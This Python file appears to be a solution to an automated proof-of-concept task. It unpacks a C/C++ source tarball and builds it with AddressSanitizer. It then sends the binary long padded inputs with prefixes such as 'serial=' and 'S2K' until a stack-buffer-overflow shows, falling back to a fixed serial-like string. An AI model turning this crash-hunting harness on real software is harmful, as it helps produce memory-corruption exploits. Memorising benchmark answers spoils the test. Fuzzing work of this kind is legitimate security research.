import os
import tarfile
import tempfile
import subprocess
import shutil
import re


def find_project_root(extract_dir: str) -> str:
    for root, dirs, files in os.walk(extract_dir):
        for f in files:
            if f.endswith(('.c', '.cc', '.cpp', '.cxx')):
                return root
    return extract_dir


def build_binary(project_root: str) -> str | None:
    c_files = []
    cpp_files = []
    for root, dirs, files in os.walk(project_root):
        for fname in files:
            full = os.path.join(root, fname)
            if fname.endswith('.c'):
                c_files.append(os.path.relpath(full, project_root))
            elif fname.endswith(('.cc', '.cpp', '.cxx')):
                cpp_files.append(os.path.relpath(full, project_root))

    if not c_files and not cpp_files:
        return None

    bin_path = os.path.join(project_root, 'poc_bin')
    env = os.environ.copy()

    def try_compile(cmd):
        try:
            r = subprocess.run(
                cmd,
                cwd=project_root,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                timeout=30,
                env=env,
            )
            if r.returncode == 0 and os.path.exists(bin_path):
                return True
        except Exception:
            return False
        return False

    if cpp_files:
        sources = cpp_files + c_files
        for compiler in ('g++', 'clang++'):
            if shutil.which(compiler) is None:
                continue
            cmd = [
                compiler,
                '-fsanitize=address',
                '-g',
                '-O0',
                '-fno-omit-frame-pointer',
                '-I.',
                '-o',
                'poc_bin',
            ] + sources
            if try_compile(cmd):
                return bin_path
    else:
        sources = c_files
        for compiler in ('gcc', 'clang'):
            if shutil.which(compiler) is None:
                continue
            cmd = [
                compiler,
                '-fsanitize=address',
                '-g',
                '-O0',
                '-fno-omit-frame-pointer',
                '-I.',
                '-o',
                'poc_bin',
            ] + sources
            if try_compile(cmd):
                return bin_path

    return None


def find_interesting_tokens(project_root: str) -> list[str]:
    tokens: list[str] = []
    interesting_pattern = re.compile(r's2k|serial|card|gpg', re.IGNORECASE)
    str_re = re.compile(r'"((?:[^"\\]|\\.)*)"')

    for root, dirs, files in os.walk(project_root):
        for fname in files:
            if not fname.endswith(('.c', '.h', '.cc', '.cpp', '.cxx')):
                continue
            path = os.path.join(root, fname)
            try:
                with open(path, 'r', encoding='utf-8', errors='ignore') as f:
                    text = f.read()
            except Exception:
                continue
            if not interesting_pattern.search(text):
                continue
            for m in str_re.finditer(text):
                s = m.group(1)
                if not s:
                    continue
                if not interesting_pattern.search(s):
                    continue
                if len(s) <= 1 or len(s) > 40:
                    continue
                if s not in tokens:
                    tokens.append(s)
    return tokens


def generate_candidates(tokens: list[str]) -> list[bytes]:
    candidates: list[bytes] = []
    seen: set[bytes] = set()

    def add(b: bytes):
        if b not in seen:
            seen.add(b)
            candidates.append(b)

    base27 = b'1234567890ABCDEF1234567890A'  # 27 bytes, hex-like serial
    add(base27)
    add(base27 + b'\n')

    for prefix in (b'serial=', b'serial:', b'SERIAL=', b'SERIAL:', b'S2K ', b's2k ', b'card '):
        add(prefix + base27 + b'\n')

    lengths = [32, 64, 128]
    for L in lengths:
        payload = b'A' * L
        add(payload)
        add(payload + b'\n')
        add(b'0 ' + payload + b'\n')
        add(b'1 ' + payload + b'\n')
        for prefix in (b'serial=', b'serial:', b'SERIAL=', b'SERIAL:', b'S2K ', b's2k ', b'card '):
            add(prefix + payload + b'\n')

    for tok in tokens[:8]:
        try:
            tok_bytes = tok.encode('ascii', errors='ignore')
        except Exception:
            continue
        if not tok_bytes:
            continue
        if b'\n' in tok_bytes or b'\r' in tok_bytes:
            continue
        for L in (27, 32, 64):
            payload = b'A' * L
            for sep in (b'', b'=', b':', b' '):
                add(tok_bytes + sep + payload + b'\n')

    return candidates


def run_candidate(bin_path: str, cwd: str, data: bytes) -> bool:
    try:
        proc = subprocess.run(
            [bin_path],
            input=data,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            cwd=cwd,
            timeout=1.0,
        )
    except Exception:
        return False

    err = proc.stderr.decode('latin-1', errors='ignore')
    if 'AddressSanitizer' in err or 'stack-buffer-overflow' in err:
        return True
    return False


class Solution:
    def solve(self, src_path: str) -> bytes:
        tmpdir = tempfile.mkdtemp(prefix='pocgen_')
        try:
            try:
                with tarfile.open(src_path, 'r:*') as tf:
                    tf.extractall(tmpdir)
            except Exception:
                # If extraction fails, just return a generic long serial-like string
                return b'1234567890ABCDEF1234567890A'

            project_root = find_project_root(tmpdir)
            poc: bytes | None = None

            try:
                bin_path = build_binary(project_root)
            except Exception:
                bin_path = None

            if bin_path is not None and os.path.exists(bin_path):
                try:
                    tokens = find_interesting_tokens(project_root)
                except Exception:
                    tokens = []
                candidates = generate_candidates(tokens)
                for cand in candidates:
                    if run_candidate(bin_path, project_root, cand):
                        poc = cand
                        break

            if poc is None:
                poc = b'1234567890ABCDEF1234567890A'
            return poc
        finally:
            shutil.rmtree(tmpdir, ignore_errors=True)